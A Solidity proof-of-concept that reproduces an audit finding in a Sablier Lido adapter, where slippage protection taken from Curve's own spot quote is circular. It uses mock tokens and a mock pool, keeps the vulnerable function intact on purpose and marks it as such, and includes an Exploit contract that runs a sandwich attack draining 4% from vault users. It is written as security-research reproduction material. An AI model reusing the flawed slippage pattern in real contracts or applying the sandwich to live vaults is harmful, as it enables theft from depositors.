// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier Bob Escrow — Circular slippage protection in
    SablierLidoAdapter::_wstETHToWeth enables sandwich attacks
    (Cyfrin / MrPotatoMagic, finding #65583)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: `_wstETHToWeth` derives `minEthOut` from Curve's `get_dy`,
    which reads the pool's CURRENT reserves — the same state `exchange`
    reads. An attacker who skews reserves (flashloan dump) makes both
    the quote and the swap reflect the depressed price, so the slippage
    check is circular and always passes. `unstakeTokensViaAdapter` is
    permissionless; the depressed rate is written once into
    `_wethReceivedAfterUnstaking` and permanently reduces every user's
    redeem share.

    Vulnerable lines preserved verbatim below (@> VULN). Fix: use a
    Chainlink stETH/ETH oracle (or caller-supplied minOut) for minEthOut. */

/// @dev Minimal ERC20 used as WETH (and as the stETH stand-in for the pool).
contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Mock Curve stETH/ETH pool. `poolManipulationBps` depresses BOTH
///      `get_dy` and `exchange` identically — the real sandwich behaviour
///      where the spot quote and the swap read the same skewed reserves.
contract MockCurvePool {
    MockWETH public immutable STETH;
    MockWETH public immutable WETH;
    address public sandwichProfitTo;

    /// @dev Slippage in bps applied on top of manipulation (unused by default).
    uint256 public actualSlippage;
    /// @dev Pool manipulation in bps — e.g. 400 = 4% price depression.
    uint256 public poolManipulationBps;

    constructor(MockWETH steth_, MockWETH weth_) {
        STETH = steth_;
        WETH = weth_;
    }

    function setSandwichRecipient(address to) external {
        sandwichProfitTo = to;
    }

    function setPoolManipulation(uint256 bps) external {
        poolManipulationBps = bps;
    }

    /// @dev Spot quote — reflects manipulated reserves when set.
    function get_dy(int128, int128, uint256 dx) external view returns (uint256) {
        if (poolManipulationBps > 0) {
            return (dx * (10_000 - poolManipulationBps)) / 10_000;
        }
        return dx;
    }

    /// @dev Swap stETH → WETH at the (possibly manipulated) rate.
    ///      The gap between fair and manipulated output is paid to the
    ///      sandwich recipient — modelling the attacker's back-run profit.
    function exchange(int128, int128, uint256 dx, uint256 minDy) external returns (uint256) {
        STETH.transferFrom(msg.sender, address(this), dx);

        uint256 actualOutput = dx;
        if (poolManipulationBps > 0) {
            actualOutput = (actualOutput * (10_000 - poolManipulationBps)) / 10_000;
        }
        if (actualSlippage > 0) {
            actualOutput = (actualOutput * (10_000 - actualSlippage)) / 10_000;
        }
        require(actualOutput >= minDy, "slippage");

        // Pay vault the depressed amount; sandwich profit to attacker.
        uint256 profit = dx - actualOutput;
        WETH.mint(msg.sender, actualOutput);
        if (profit > 0 && sandwichProfitTo != address(0)) {
            WETH.mint(sandwichProfitTo, profit);
        }
        return actualOutput;
    }
}

/// @dev Minimal wstETH: 1:1 wrap/unwrap for the synthetic.
contract MockWstETH {
    MockWETH public immutable STETH;
    mapping(address => uint256) public balanceOf;

    constructor(MockWETH steth_) {
        STETH = steth_;
    }

    function wrap(uint256 stETHAmount) external returns (uint256) {
        STETH.transferFrom(msg.sender, address(this), stETHAmount);
        balanceOf[msg.sender] += stETHAmount;
        return stETHAmount;
    }

    function unwrap(uint256 wstETHAmount) external returns (uint256) {
        balanceOf[msg.sender] -= wstETHAmount;
        STETH.transfer(msg.sender, wstETHAmount);
        return wstETHAmount;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @dev Reduced SablierLidoAdapter focusing on the circular `_wstETHToWeth`.
contract SablierLidoAdapter {
    // MAX_SLIPPAGE_TOLERANCE = 0.05e18 (5%); we use 0.5% default like prod.
    uint256 public constant UNIT = 1e18;
    uint256 public slippageTolerance = 0.005e18; // 0.5%

    MockWstETH public immutable WSTETH;
    MockWETH public immutable WETH;
    MockWETH public immutable STETH;
    MockCurvePool public immutable CURVE_POOL;

    mapping(uint256 => uint128) internal _vaultTotalWstETH;
    mapping(uint256 => uint128) internal _wethReceivedAfterUnstaking;

    address public sablierBob;

    constructor(MockWstETH wsteth_, MockWETH weth_, MockWETH steth_, MockCurvePool curve_) {
        WSTETH = wsteth_;
        WETH = weth_;
        STETH = steth_;
        CURVE_POOL = curve_;
    }

    function setSablierBob(address bob_) external {
        require(sablierBob == address(0), "set");
        sablierBob = bob_;
    }

    modifier onlyBob() {
        require(msg.sender == sablierBob, "only bob");
        _;
    }

    function getWethReceivedAfterUnstaking(uint256 vaultId) external view returns (uint256) {
        return _wethReceivedAfterUnstaking[vaultId];
    }

    function getTotalYieldBearingTokenBalance(uint256 vaultId) external view returns (uint128) {
        return _vaultTotalWstETH[vaultId];
    }

    /// @dev Seed vault wstETH holdings (simulates prior stake of depositors).
    function seedVault(uint256 vaultId, uint128 totalWstETH) external {
        _vaultTotalWstETH[vaultId] = totalWstETH;
        // Place the wstETH on the adapter so unwrap/exchange can proceed.
        WSTETH.mint(address(this), totalWstETH);
        // Also fund the underlying stETH held by MockWstETH for unwrap.
        STETH.mint(address(WSTETH), totalWstETH);
    }

    function unstakeFullAmount(uint256 vaultId) external onlyBob returns (uint128 amountReceivedFromUnstaking) {
        uint128 totalWstETH = _vaultTotalWstETH[vaultId];
        amountReceivedFromUnstaking = _wstETHToWeth(totalWstETH);
        _wethReceivedAfterUnstaking[vaultId] = amountReceivedFromUnstaking;
        // Transfer WETH to Bob for distribution.
        WETH.transfer(sablierBob, amountReceivedFromUnstaking);
    }

    /// @dev VERBATIM reduction of SablierLidoAdapter::_wstETHToWeth.
    ///      minEthOut is derived from get_dy (current reserves) — circular.
    function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
        // Interaction: Unwrap wstETH to get stETH.
        uint256 stETHAmount = WSTETH.unwrap(wstETHAmount);

        // Get expected amount of ETH to receive from swapping stETH for ETH via Curve.
        // @> VULN: minEthOut is derived from get_dy, which reads the same
        //    current (attacker-manipulable) reserves that exchange reads.
        //    Slippage only guards price movement BETWEEN get_dy and exchange
        //    in the same tx (always zero). Sandwich front-run depresses both.
        //    FIX: use Chainlink stETH/ETH oracle (or caller-supplied minOut).
        uint256 expectedEthOut = CURVE_POOL.get_dy(1, 0, stETHAmount);

        // Calculate minimum acceptable output with slippage tolerance.
        // ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap() → plain math
        uint256 minEthOut = (expectedEthOut * (UNIT - slippageTolerance)) / UNIT;

        // Interaction: Swap stETH for ETH via Curve.
        STETH.approve(address(CURVE_POOL), stETHAmount);
        uint256 ethReceived = CURVE_POOL.exchange(1, 0, stETHAmount, minEthOut);

        // Check: the amount of ETH received is greater than the minimum acceptable output.
        if (ethReceived < minEthOut) {
            revert("slippage exceeded");
        }

        // (In prod: wrap ETH → WETH; our mock exchange already pays WETH.)
        return uint128(ethReceived);
    }
}

/// @dev Reduced SablierBob — permissionless unstakeTokensViaAdapter.
contract SablierBob {
    SablierLidoAdapter public immutable adapter;
    uint256 public constant VAULT_ID = 1;
    bool public isStakedInAdapter = true;

    constructor(SablierLidoAdapter adapter_) {
        adapter = adapter_;
    }

    /// @dev Permissionless — attacker controls timing of the sandwich.
    function unstakeTokensViaAdapter() external returns (uint128 amountReceivedFromAdapter) {
        require(isStakedInAdapter, "already");
        require(adapter.getTotalYieldBearingTokenBalance(VAULT_ID) > 0, "empty");
        amountReceivedFromAdapter = adapter.unstakeFullAmount(VAULT_ID);
        isStakedInAdapter = false;
    }
}

/// @dev Orchestrator. CREATE order (nonces start at 1):
///      1 STETH, 2 WETH, 3 MockCurvePool, 4 MockWstETH, 5 SablierLidoAdapter,
///      6 SablierBob.
contract Exploit {
    MockWETH public steth; // CREATE 1
    MockWETH public weth; // CREATE 2
    MockCurvePool public curve; // CREATE 3
    MockWstETH public wsteth; // CREATE 4
    SablierLidoAdapter public adapter; // CREATE 5 — vulnerable
    SablierBob public bob; // CREATE 6

    uint128 public constant VAULT_WSTETH = 100 ether;
    uint256 public constant MANIPULATION_BPS = 400; // 4% depression

    constructor() {
        steth = new MockWETH();
        weth = new MockWETH();
        curve = new MockCurvePool(steth, weth);
        wsteth = new MockWstETH(steth);
        adapter = new SablierLidoAdapter(wsteth, weth, steth, curve);
        bob = new SablierBob(adapter);
        adapter.setSablierBob(address(bob));

        // Sandwich profit accrues to this Exploit contract.
        curve.setSandwichRecipient(address(this));

        // Seed a settled adapter vault with 100 wstETH ready to unstake.
        adapter.seedVault(1, VAULT_WSTETH);
    }

    function run() external {
        // Fair baseline (no manipulation): would receive 100 WETH.
        // We do NOT unstake fair path here (would consume the vault); instead
        // we compute the fair amount analytically (1:1) and run the sandwich.

        uint256 attackerBefore = weth.balanceOf(address(this));
        require(attackerBefore == 0, "clean start");

        // --- 1. FRONT-RUN: attacker dumps stETH into Curve, depresses rate 4% ---
        curve.setPoolManipulation(MANIPULATION_BPS);

        // --- 2. Call permissionless unstakeTokensViaAdapter ---
        // Inside _wstETHToWeth:
        //   get_dy → 96 WETH (manipulated)
        //   minEthOut = 96 * 0.995 = 95.52 WETH
        //   exchange → 96 WETH, passes the circular check
        bob.unstakeTokensViaAdapter();

        uint256 sandwichWethReceived = adapter.getWethReceivedAfterUnstaking(1);
        require(sandwichWethReceived == 96 ether, "vault got 96");

        // --- 3. BACK-RUN: attacker restores pool, keeps sandwich profit ---
        curve.setPoolManipulation(0);

        // Attacker profit = 4 WETH (the gap between fair 100 and manipulated 96).
        uint256 attackerAfter = weth.balanceOf(address(this));
        require(attackerAfter == 4 ether, "sandwich profit 4");

        // Permanent harm: _wethReceivedAfterUnstaking is 96 forever — every
        // subsequent user redemption is reduced ~4% vs fair.
        uint256 fair = uint256(VAULT_WSTETH);
        uint256 stolen = fair - sandwichWethReceived;
        require(stolen == 4 ether, "4 WETH stolen from vault users");
        require(stolen * 100 / fair >= 3, "loss >= 3%");

        // Slippage check did NOT protect: unstake succeeded despite 4% move
        // (well under the 5% MAX_SLIPPAGE_TOLERANCE, but the check is circular
        // so even larger moves within tolerance of the depressed quote pass).
        require(sandwichWethReceived > 0, "unstake succeeded under manipulation");
    }
}
